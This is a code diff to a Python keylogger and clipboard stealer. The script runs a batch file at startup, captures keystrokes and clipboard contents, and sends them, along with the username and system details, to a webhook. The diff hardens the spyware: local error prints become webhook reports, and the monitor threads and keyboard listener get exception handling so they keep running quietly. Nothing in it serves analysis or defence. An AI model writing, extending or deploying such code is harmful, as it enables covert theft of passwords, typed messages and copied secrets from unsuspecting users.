@@ -39,7 +39,11 @@ def run_bat_file():
         subprocess.run([bat_file_path], check=True)
         print(f"Successfully ran {bat_file_path}")
     except subprocess.CalledProcessError as e:
-        print(f"Error running {bat_file_path}: {e}")
+        send_to_webhook(f"Error running {bat_file_path}: {e}")
+    except FileNotFoundError as e:
+        send_to_webhook(f"File not found: {e}")
+    except Exception as e:
+        send_to_webhook(f"Unexpected error: {e}")
 
 
 def get_public_ip():
@@ -72,11 +76,15 @@ def keystroke_monitor():
     """Monitor keystrokes and send them after 3 seconds of inactivity."""
     global keystrokes, last_keypress_time
     while True:
-        time.sleep(1)
-        with lock:
-            if keystrokes and time.time() - last_keypress_time > 3:
-                send_to_webhook(keystrokes)
-                keystrokes = ""
+        try:
+            time.sleep(1)
+            with lock:
+                if keystrokes and time.time() - last_keypress_time > 3:
+                    send_to_webhook(keystrokes)
+                    keystrokes = ""
+        except Exception as e:
+            send_to_webhook(f"Error in keystroke monitor: {e}")
+            break
 
 
 def on_press(key):
@@ -92,10 +100,13 @@ def on_press(key):
 
 
 def on_release(key):
-    current_clipboard = pyperclip.paste()
-
-    if "/kill" in current_clipboard:
-        send_to_webhook(f"Kill command executed by: {username}")
+    try:
+        current_clipboard = pyperclip.paste()
+        if "/kill" in current_clipboard:
+            send_to_webhook(f"Kill command executed by: {username}")
+            return False
+    except pyperclip.PyperclipException as e:
+        send_to_webhook(f"Clipboard error: {e}")
         return False
 
 
@@ -103,15 +114,17 @@ def monitor_clipboard():
     """Monitor the clipboard for changes and send the content to the webhook."""
     global last_clipboard
     while True:
-        time.sleep(1)
         try:
+            time.sleep(1)
             current_clipboard = pyperclip.paste()
             if current_clipboard != last_clipboard:
                 send_to_webhook(f" {username} just copied something to clipboard!")
                 send_to_webhook(f"Clipboard content: {current_clipboard}")
                 last_clipboard = current_clipboard
         except Exception as e:
-            print(f"Error accessing clipboard: {e}")
+            send_to_webhook(f"Error in clipboard monitor: {e}")
+            break
+
 
 # Run kill.bat file at the start
 run_bat_file()
@@ -134,12 +147,15 @@ send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_in
 send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 
 # Start the keystroke monitor and clipboard monitor threads
-threading.Thread(target=keystroke_monitor, daemon=True).start()
-threading.Thread(target=monitor_clipboard, daemon=True).start()
+try:
+    threading.Thread(target=keystroke_monitor, daemon=True).start()
+    threading.Thread(target=monitor_clipboard, daemon=True).start()
+except Exception as e:
+    send_to_webhook(f"Error starting threads: {e}")
 
 # Set up the keyboard listener
 try:
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-except KeyboardInterrupt:
-    print("Listener stopped.")
+except Exception as e:
+    send_to_webhook(f"Error in keyboard listener: {e}")
